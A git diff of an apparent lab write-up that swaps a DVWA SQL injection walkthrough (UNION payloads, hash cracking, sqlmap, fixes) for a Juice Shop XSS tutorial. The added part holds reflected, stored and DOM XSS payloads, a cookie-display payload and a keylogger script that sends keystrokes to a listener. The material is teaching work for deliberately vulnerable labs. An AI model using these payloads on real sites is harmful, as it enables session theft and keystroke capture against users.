@@ -8,102 +8,93 @@ For this lab We're going to find a real input field on Juice Shop that reflects 
 <br />
 <h2> What's covered:</h2>
 
-- Intercepting POST requests with Burp Suite
-- Manual UNION based SQL injection without automated tools
+- Payload in URL, bounces back, only the victim who clicks the link.
+- Payload saved in the database for every user who visits the page. 
 
-- Hex encoding to bypass quote filters
-
-- Extracting database names, tables, columns, and password hashes
-
-- Cracking MD5 hashes with Hashcat and rockyou.txt
-
-- Automating extraction with sqlmap
-
+- Payload in URL fragment, JS processes it for the victim who clicks the link.
 
 <br />
 
 
 <h2>Spinning up the lab:
-Here I have DVWA running as a Docker container managed via Portainer. Navigate to your Portainer instance, start your Dvwa container, then access DVWA in your browser at http://10.10.30.129 (my address). Log in with the default credentials. Once logged in, set the security level to Medium under DVWA Security before starting.
+Find the Vulnerable Search Bar (Reflected XSS)
 </h2>
 
-- Username: admin 
-- Password: password
-<br />
-<br />
-<img src="https://imgur.com/51IepoD.jpg"  height="80%" width="80%">
+- Juice Shop's search bar is vulnerable to reflected XSS
+- Click the search icon at the top of the page and try a normal search like "Apples
+
 
 <br />
 <br />
-<img src="https://imgur.com/1KVKk5o.jpg"  height="80%" width="80%">
-<br />
-<br />
-
-<h2>On Medium security level, DVWA replaces the free text input box with a dropdown menu. The security control is client-side only. Once you intercept the request in Burp, you can modify the id value to anything you want, regardless of what the dropdown allows.</h2>
-
-<br />
-<img src="https://imgur.com/RYcx2Av.jpg"  height="80%" width="80%">
-<br />
-
-- Go to Proxy and turn Intercept ON 
-- Go to DVWA  and click on SQL Injection on the left menu 
-
-- Select user ID 1 from the dropdown and click Submit
+<img src="https://imgur.com/06lTGEx.jpg"  height="80%" width="80%">
 
 <br />
 
-<img src="https://imgur.com/nqHIBNx.jpg"  height="80%" width="80%">
+- Notice the URL becomes (http://10.10.30.131:3000/#/search?q=apple)
+- And the page also  shows "Search Results for apple. Your input reflects  on the screen.
+That reflection is the vulnerability.
+
+<br />
+<img src="https://imgur.com/oRxzayQ.jpg"  height="80%" width="80%">
+<br />
 <br />
 
-- Burp should catch the Post request 
-
 <br />
-<img src="https://imgur.com/YFufyj4.jpg"  height="80%" width="80%">
 <br />
 
-- Right-click on Post request and Send to Repeater
-- Turn Intercept OFF
+- Now in the search box type ( <iframe src="javascript:alert('XSS')"> )
+- You should see a popup alert box appear on screen 
+
+
 <br />
-<img src="https://imgur.com/tiJQFYN.jpg"  height="80%" width="80%">
+
+<img src="https://imgur.com/uBLzilT.jpg"  height="80%" width="80%">
+<br />
+
+-  log into Juice Shop with any account.
+-  Email (admin@juice-sh.op)
+-  Password (admin123)
+
+<br />
+<img src="https://imgur.com/fagBqXF.jpg"  height="80%" width="80%">
+<br />
+
+-  After logging in, search for this payload using this command in the vulnerable search bar  ( <iframe src="javascript:alert(document.cookie)"> )
+-  The app's session credential. In a real attack, this gets sent to the attacker's server instead of just being displayed.
+  
+<br />
+<img src="https://imgur.com/cb8lESG.jpg"  height="80%" width="80%">
 <br/>
-
-- We see that the app takes  id=1 and drops it straight into a SQL query
-- In Burp Repeater, change the body and hit "Send" each time
-- id=1 AND 1=1&Submit=Submit (Same response, the injection confirmed working)
-- id=1 ORDER BY 2&Submit=Submit(Same response, the injection confirmed working)
-- Find which columns are visible on screen, Extract Database Info and Dump All Tables (id=-1 UNION SELECT 1,2&Submit=Submit) (id=-1 UNION SELECT table_name,table_schema
-FROM information_schema.tables
-WHERE table_schema=database()&Submit=Submit)
-
-<br />
-<br />
-<img src="https://imgur.com/Mm6guBz.jpg"  height="80%" width="80%">
-<br />
-
-- Hex encoding of user-level filter quotes so we use hex instead of 'users'. Convert any string and crack the Hash
-- Using bash or crackstation.net, crack the Hash
-- Here, I choose to automate the Whole Attack with sqlmap, which is faster in my opinion 
-
-<br />
-<br/>
-<img src="https://imgur.com/92dpXhh.jpg"  height="80%" width="80%">
-<img src="https://imgur.com/o3aw8Gi.jpg"  height="80%" width="80%">
-<img src="https://imgur.com/tiKS1j2.jpg"  height="80%" width="80%">
-<br />
-
-<h1>  The Fixes From a Defender's Point of  View
+<h1> Reflected XSS only hits the person who clicks the link. Stored XSS gets saved to the database and hits every user who visits the page.
 </h1>
 
-- Vulnerability = POST data injected into SQL
-- Vulnerability = Running DB as root
-- Vulnerability = MD5 password hashing
-- Vulnerability = No input validation
-<h1>  The Fixes </h1>
+- Go to the product reviews section, click any product, and scroll down to the reviews section. 
+- In the review box type ( <script>alert('Stored XSS')</script> ) and  submit the review. 
+- Every time anyone views this product, the script fires in their browser.
 
-- Queries should always be parameterized
-- Least privilege, the Database user gets SELECT only
-- Use bcrypt or argon2id
-- Whitelist numeric IDs,  and reject everything else
+<br />
+<br />
+<img src="https://imgur.com/STB5YfF.jpg"  height="80%" width="80%">
+<img src="https://imgur.com/LFsfefk.jpg"  height="80%" width="80%">
+<br />
+
+- DOM Based XSS, this never touches the server; the vulnerability lives entirely in the frontend JavaScript code.
+- Go to this URL directly, your ipaddress should be different from mine ( http://10.10.30.131:3000/#/search?q=<script>alert('DOM XSS')</script> ).
+- DOM XSS is hardest to detect because server side scanners never see the payload,  it lives in the URL fragment (#), which browsers don't send to the server.
+- Keylogger via XSS makes XSS truly dangerous. Paste this in the search bar ( <iframe src="javascript:
+  document.onkeypress=function(e){
+    new Image().src='http://10.10.30.131:8000/?k='+e.key
+  }"> )
+- Then, on your Kali machine, start a listener
+
+<br />
+<br/>
+<img src="https://imgur.com/N4wmVF8.jpg"  height="80%" width="80%">
+<img src="https://imgur.com/7atwv5K.jpg"  height="80%" width="80%">
+<img src="https://imgur.com/657wVnI.jpg"  height="80%" width="80%">
+<br />
+
+
 
 <br />
 <br/>
